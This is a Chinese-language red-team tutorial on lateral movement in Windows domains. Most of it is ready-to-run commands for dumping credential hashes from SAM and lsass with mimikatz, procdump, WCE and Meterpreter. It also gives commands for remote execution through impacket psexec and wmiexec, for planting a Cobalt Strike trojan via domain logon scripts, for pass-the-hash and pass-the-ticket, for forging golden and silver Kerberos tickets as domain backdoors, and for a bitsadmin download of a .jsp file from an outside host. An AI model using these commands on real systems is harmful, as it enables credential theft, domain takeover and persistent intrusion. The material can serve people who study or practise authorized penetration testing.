---
title: 【红队】横向移动之--散列值获取
---
# LM Hash和NTML Hash

Windows操作系统中的密码由两部分加密组成，即`LM Hash`和`NTML Hash`。

LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用`0`补全。

自`Server 2003`之后，Windows的认证方式均为NTML Hash。

自`Server 2008`开始默认禁用`LM Hash`， 当密码超过14位时候会采用NTLM加密

如果抓取的`LM Hash`为 `AAD3B435B51404EEAAD3B435B51404EE`，说明密码为空或`LM Hash`被禁用。

|      | 2000 | xp   | 2003 | Vista | win7 | 2008 | 2012 |
| :--- | :--- | :--- | :--- | :---- | :--- | :--- | :--- |
| LM   | √    | √    | √    |       |      |      |      |
| NTLM | √    | √    | √    | √     | √    | √    | √    |

 前面三个，当密码超过14位时候会采用NTLM加密。

**Hash一般存储在两个地方**

> **SAM文件**：存储在本机，对应本地用户
>
> **NTDS.DIT文件**：存储在域控上，对应域用户

------

关于内网协议的深入研究可以参考 daiker 师傅的总结（Kerberos、NTML、LDAP）

地址：https://daiker.gitbook.io/windows-protocol/ 

**比较老的工具**

`WCE`、`Pwdump7`、`Quarks PwDump`等（都会被杀软查杀）

```bash
PwDump7.exe
QuarksPwDump.exe --dump-hash-local
```

 **WCE**常用于列出登录会话，以及列出、、修改、删除关联凭据（LM Hash、NTLM Hash、明文密码和kerberos票据）

```bash
#抓系统管理员明文密码
wce.exe -w

#抓hash，列出登录的会话和NTLM凭据
wce.exe -l

#重点，在无法破解目标hash明文的情况下可用hash注入
wce.exe -s 目标用户名:目标域名或IP:LM-HASH:NT-HASHwce.exe -s Administrator:192.168.2.130:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634
```

> hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程`lsass.exe`中去
>
> 使得本地在使用`ipc`登录目标机器的时候就如同自己登录自己的机器一样获得权限

## 无工具利用注册表 + mimikatz本地读取（推荐）

**（1）导出SAM和System文件**

 Win2000和XP需要先提到`SYSTEM`，03开始直接可以reg save

```bash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
```

**（2）mimikatz本地读取 NTML Hash**

> mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；
>
> 还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。

```bash
#将导出的文件和mimikatz放到同一目录
mimikatz.exelsadump::sam /sam:sam.hive /system:system.hive /security:security.hive
```

## Sharpdump

需要.NET 3.5版本框架

 下载地址：https://github.com/GhostPack/SharpDump 

## Procdump + mimikatz本地读取

**（1） Procdump dump lsass（管理员权限下运行 ）**

```bash
#32位系统
procdump.exe -accepteula -ma lsass.exe lsass.dmp

#64位系统
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

**（2）mimikatz本地读取hash**

```bash
#放到同一目录
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

## MSF模块

如果你有一个SYSTEM权限的`Metepreter`会话，可以直接`hashdump`（只能dump本地用户）

```
meterpreter> hashdump
```

**smart_hashdump**

可以dump本地 + 域用户hash

```
use post/windows/gather/smart_hashdump
```

**加载第三方模块**

**KIWI**

```bash
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
```

**mimikatz**

```bash
meterpreter> load mimikatz
meterpreter> msv
meterpreter> kerberostials
```

（**以上MSF模块，都需要SYSTEM权限**）

## mimikatz在线读取SAM文件获取Hash

将mimikatz上传到目标主机，需要免杀，并且要SYSTEM权限。

```bash
#运行mimikatz,提升权限并读取SAM文件，获取NTML Hash
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

#读取散列值和明文密码
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" exit
```

# 指定主机上线

## IPC命名管道连接

**利用条件**

1、目标开启139、445端口

2、管理员开启默认共享（admin$、c$、d$等）

**建立一个连接**

```bash
net use \\目标IP\ipc$ "密码" /user:账号

#查看当前已建立的连接
net use

#列出目标目录文件
dir \\目标IP\c$

#映射共享磁盘到本地
net use z: \\IP\c$ "密码" /user:"用户名"

#删除连接
net user \\目标IP\ipc$ /del

#删除共享映射
net use * /del
```

## 无防火墙

**psexec、wmiexec等方式获取指定主机命令执行权限**

impacket工具包：https://github.com/SecureAuthCorp/impacket

**impacket工具包中的PsExec**

```bash
python psexec.py 用户名:密码@目标IPpython psexec.py Administrator:@hack.51463708@10.1.1.14
```

会直接反弹一个SYSTEM权限的shell。

> 随着PsExec在内网中被严格监控，越来越多的杀毒厂商已经把PsExec加入了黑名单；
>
> 而且PsExec执行程序时会创建一个psexec服务，并产生大量日志，可以通过日志反推攻击流程。

**使用WMI执行程序（目标需开放135端口）**

WMI是Windows的一个管理工具集，Windows默认不会把WMI的操作记录到日志中

**impacket工具包中的wmiexec**

```bash
python wmiexec.py administrator:@hack.51463708@10.1.1.14
```

**Impacket中的smbexec.py** 

```bash
python smbexec.py administrator:@hack.51463708@10.1.1.14
```

## 防火墙全开

**1、通过组策略下发命令执行**

改一下这个[三好学生的脚本](https://3gstudent.github.io/3gstudent.github.io/域渗透-利用GPO中的计划任务实现远程执行/)就能用

**2、通过设置登陆脚本上线指定用户**

>  IPC连接到域控，copy文件，在成员上执行 
>
>  login.bat 是cs生成的马

一）使用dsmod给指定域用户设置登陆脚本

login.bat放在域控的NETLOGON目录下面

```bash
copy login.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\login.bat
dsmod user -loscr "test.bat" "CN=x,OU=x,DC=x,DC=x,DC=x"
```

二）登陆脚本给指定用户种马

login.bat放在域控的NETLOGON目录下面

```bash
copy login.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat
net user xp /scriptpath:login.bat # 内网域成员机器可以使用bash
gpupdate /force           # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机
```

# Hash传递攻击 

> 哈希传递（Pass The Hash）攻击，直接将`NTML Hash`的散列值传递到其它主机，进行权限认证，获取控制权。
>
> 在域环境中，用户大都使用域账号登录，大量计算机在安装时会使用相同的本地管理员账号和密码；
>
> 因此，**如果计算机的本地账户名密码和目标相同**，就能通过哈希传递攻击获取目标主机控制权。
>
> **想要使用mimikatz的哈希传递功能，必须具有本地管理员权限（mimikatz需要高权限进程lsass.exe的执行权限）**

## 一、使用NTML Hash进行哈希传递

**（1）在目标机器中以管理员权限运行mimikatz**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:wintrysec.lab /ntlm:<NTML Hash>"
#<NTML Hash>为：f3a0acba8bcfb8a0896281bbfcb793ed这样的一串字符
```

**（2）列出目标域控C盘内容**（会自动弹出一个cmd.exe）

```bash
dir \\DC\c$   #测试是否成功
```

## 二、使用AES-256进行哈希传递 

> 当系统安装了`KB2871997`补丁，将无法使用常规的哈希传递攻击；
>
> 但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。

**（1）抓取AES-256密钥**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

**（2）管理员权限运行mimikatz**

```bash
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:wintryse.lab /aes256:<AES-256密钥>"
```

## 三、不使用mimikatz进行哈希传递

**使用impacket软件包**

```bash
psexec.py -hashes :<hash> 域/域用户名@目标IP
smbexec.py -hashes :<hash> 域/域用户名@目标IP
wmiexec.py -hashes :<hash> 域/域用户名r@目标IP whoami
```

**MSF模块**

```bash
use exploit/windows/smb/psexec

#关键设置
set SMBPass <LM Hash>:<NTML Hash>
```

# 票据传递攻击

> 票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。
>
> 在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。
>
> 这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。
>
> 新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。

工具kekeo：https://github.com/gentilkiwi/kekeo/releases 

（1）在当前目录生成一个高权限票据文件

```bash
kekeo.exe "tgt::ask /user:Administrator /domain:wintrysec.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed" exit
```

（2）使用系统自带命令，清除内存中的票据

```baash
klist purge
```

（3）将票据文件导入内存

```bash
kekeo "kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi" exit
```

（4）列出远程主机的文件

```bash
dir \\DC\c$
```

`比较典型的金票和银票留域后门就是票据传递攻击`

# Kerberos认证协议

Kerberos是一种基于票据的集中式的认证方式，认证过程涉及到三方：Client、Server、KDC。

在Windows域环境中，KDC的角色常常由DC（域控制器）来担任。

票据（Ticket）用来安全的在认证服务器和用户请求的服务之间传递用户的身份。

> **KDC（Key Distribution Center）：**密钥分发中心，kerberos认证服务器，由AS和TGS组成，在认证中会访问 AD数据库；
>
> **AS（Authentication Server）：**身份认证服务
>
> **TGS（Ticket Granting Server）：**票据授予服务，该服务提供的票据为（**白银票据**）
>
> **TGT（Ticket Granting Ticket）：**身份认证服务授予的票据（**黄金票据**），用于身份认证，存储在内存，默认有效期为10小时

在域环境中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。

# 金票和银票

## 黄金票据（Golden Ticket）

> 黄金票据：即伪造的`TGT`票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取`任意Server`的票据（ST）。
>
> 有了金票就有了当前域内的最高控制权限。

金票的**利用原理**是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。

由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。

伪造的黄金票据是 有效的TGT票据，因为它是由域账号`krbtgt`的`NTLM Hash`加密和签名的。

TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。

**1、导出`krbtgt`的`NTML Hash`**

域管理员权限运行mimikatz（或其它域主机的本地管理员账号密码和域控相同也行）

```bash
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit

#MSF中的hashdump也可以
meterpreter> hashdump
```

**2、获取域中所有用户SID**

应用的时候，去掉SID最后的数字

```bash
#只要是域用户权限就行
wmic useraccount get name,sid
```

**3、制造黄金票据**

**（1）清空现有票据**

```bash
mimikatz.exe "kerberos::purge" exit
```

**（2）生成票据**

```bash
mimikatz.exe "kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi" exit
```

**4、将票据注入内存**

```bash
mimikatz.exe "kerberos::ptt Administrator.kiribi" exit
```

**5、检索当前会话中的票据**

```bash
mimikatz.exe "kerberos::tgt" exit
```

**6、权限验证**

列出域控的C盘

```
dir \\DC\c$
```

**使用meterpreter中的kiwi模块** 

```bash
meterpreter> load kiwi

#创建票据
meterpreter> golden_ticket_create -d wintrysec.lab -u Administrator -s S-1-5-21-1160434164-3042164129-2463410311 -k a8424e3f13e1253ea732a5245f2f4266 -t /tmp/krbtgt.ticket

#注入到内存
meterpreter> kerberos_ticket_use /tmp/krbtgt.ticket

#然后验证权限
dir \\DC\c$
```

> **当拿到域控后，通过伪造黄金票据，可以在域中留下一个畅通全域的后门**
>
> **防御方法：**修改域管理员密码后，同时也要修改`krbtgt`用户的密码

## 白银票据 （Silver Ticket）

> **白银票据**：即伪造的`TGS`票据，也称服务票据ST。
>
> 攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。
>
> 当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。
>
> Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。
>
> 因此，银票的关键也在于Server的HTLM-Hash

**获取Server（目标服务器）的NTML hash**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

或MSF模块

```bash
meterpreter > load mimikatz
meterpreter > msv
```

**制造白银票据**

**（1）清空当前系统的票据**

```bash
#使用系统命令
klist purge
```

**（2）伪造票据**

```bash
mimikatz.exe "kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt" exit
```

**（3）验证权限**

```
dir \\DC\c$
```

## 黄金票据和白银票据的不同 

**访问权限不同：**

- Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限
- Silver Ticket：伪造TGS，只能访问指定的服务

**加密方式不同：**

- Golden Ticket由Kerberos的Hash加密
- Silver Ticket由服务账号（通常为计算机账户）Hash加密

**认证流程不同：**

- Golden Ticket的利用过程需要访问域控，
- 而Silver Ticket不需要

# Windows文件下载

```bash
bitsadmin /transfer n http://192.168.9.202/wintrysec.jsp C:\Users\Administrator\Desktop\新建文件夹\wintrysec.jsp
```